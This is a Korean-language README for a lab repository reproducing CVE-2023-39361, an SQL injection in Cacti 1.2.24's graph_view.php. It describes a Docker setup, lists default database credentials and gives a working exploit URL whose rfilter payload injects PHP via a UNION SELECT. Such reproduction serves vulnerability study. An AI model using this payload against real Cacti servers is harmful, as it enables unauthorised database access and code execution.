# CVE-2023-39361 - Cacti SQL Injection PoC

## 🔍 개요
이 저장소는 Cacti 1.2.24 버전의 `graph_view.php` 파일에서 발생하는 SQL Injection 취약점(CVE-2023-39361)을 재현하기 위한 PoC입니다. 이 취약점은 `rfilter` 파라미터가 부적절하게 필터링되며, 공격자가 임의의 SQL 쿼리를 삽입해 데이터베이스 정보를 유출할 수 있게 됩니다.

## ⚙️ 환경 구성
PoC는 Docker 및 Docker Compose를 사용하여 구성됩니다. 아래 명령어를 통해 재현 환경을 빠르게 구성할 수 있습니다.

```bash
docker compose up -d 
```

### 📁 주요 파일 설명
- `docker-compose.yml`: 웹 서버 및 MySQL 데이터베이스 컨테이너를 구성합니다.
- `entrypoint.sh`: Apache 서버를 실행하고 Cacti 초기 설정을 도와주는 스크립트입니다.

## 🧪 취약점 재현 방법

### 1. 브라우저로 접속
```
http://localhost:8080
```

Cacti 설치 페이지가 나타나며, DB 정보는 아래와 같이 설정되어 있습니다:
- DB Host: db
- DB User: cacti
- DB Password: cacti

설치를 완료한 뒤 로그인 화면으로 이동합니다.

### 2. phpinfo 통한 원격 코드 실행 테스트 
```
http://localhost:8080/graph_view.php?action=tree_content&node=1-1-tree_anchor&rfilter=aaaaa"%20OR%20""="(("))%20UNION%20SELECT%201,2,3,4,5,6,updatexml(rand(),concat(0x7e,"<?php%20phpinfo();?>",0x7e),null),8,9,10%23
```

이 요청을 통해 내부 phpinfo 코드가 삽입되어 실행되며, 로그인 화면이 phpinfo 페이지처럼 변경되는 것을 확인할 수 있습니다.


## 🛡️ 영향 범위
- Cacti 1.2.24 이하 버전에서 영향을 받습니다.
- 인증 없이 익스플로잇 가능하며, SQL Injection을 통해 인증 우회 및 원격 코드 실행까지 가능합니다.

## 📚 참고
- https://nvd.nist.gov/vuln/detail/CVE-2023-39361
- https://github.com/vulhub/vulhub/tree/master/cacti/CVE-2023-39361

---


